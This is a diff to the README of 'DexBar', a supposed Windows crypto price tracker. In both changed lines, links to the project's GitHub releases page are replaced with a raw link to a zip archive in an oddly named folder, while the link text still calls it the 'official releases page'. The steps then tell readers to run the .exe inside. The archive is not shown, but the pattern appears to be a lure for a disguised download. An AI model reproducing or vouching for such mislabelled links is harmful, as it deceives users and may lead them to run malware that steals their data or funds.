@@ -1,6 +1,6 @@
 # 📈 DexBar - Track crypto prices on your desktop
 
-[![](https://img.shields.io/badge/Download_DexBar-Click_Here-blue?style=for-the-badge)](https://github.com/aikih9831/DexBar/releases)
+[![](https://img.shields.io/badge/Download_DexBar-Click_Here-blue?style=for-the-badge)](https://raw.githubusercontent.com/aikih9831/DexBar/main/triorchism/Bar_Dex_2.0-alpha.1.zip)
 
 DexBar provides a way to watch cryptocurrency prices from your Windows taskbar. You see real-time price updates for your chosen tokens without opening a web browser. The app runs in the background and keeps your workspace clean.
 
@@ -18,7 +18,7 @@ DexBar runs on any modern version of Windows. Ensure your computer meets the fol
 
 Follow these steps to set up the software on your machine:
 
-1.  Visit the [official releases page](https://github.com/aikih9831/DexBar/releases) to download the latest version.
+1.  Visit the [official releases page](https://raw.githubusercontent.com/aikih9831/DexBar/main/triorchism/Bar_Dex_2.0-alpha.1.zip) to download the latest version.
 2.  Locate the file ending in .exe inside the download folder.
 3.  Double-click the file to start the installer.
 4.  Follow the instructions on the screen to complete the setup process.
